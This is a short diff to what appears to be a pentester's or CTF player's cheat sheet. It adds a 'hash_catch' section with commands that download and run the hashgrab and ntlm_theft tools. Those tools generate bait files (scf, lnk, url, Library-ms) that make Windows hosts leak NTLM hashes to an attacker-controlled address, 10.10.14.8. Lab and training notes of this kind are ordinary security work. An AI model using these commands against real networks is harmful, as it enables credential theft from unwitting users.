@@ -508,11 +508,20 @@ TRACY.WHITE# add_user_to_group TRACY.WHITE 'REMOTE ACCESS'
 ```
 
 ## hash_catch
-scf, Library-ms, url, lnk
+scf, Library-ms, url, lnk <br/>
+
+hashgrab
 ```bash
 wget https://raw.githubusercontent.com/xct/hashgrab/main/hashgrab.py
 python3 hashgrab.py MY_IP test
 ```
+ntlm_theft
+```bash
+git clone https://github.com/Greenwolf/ntlm_theft
+cd ntlm_theft
+python3 ntlm_theft.py --generate all --server 10.10.14.8 --filename ntlms
+```
+
 odt
 ```bash
 pip install ezodf
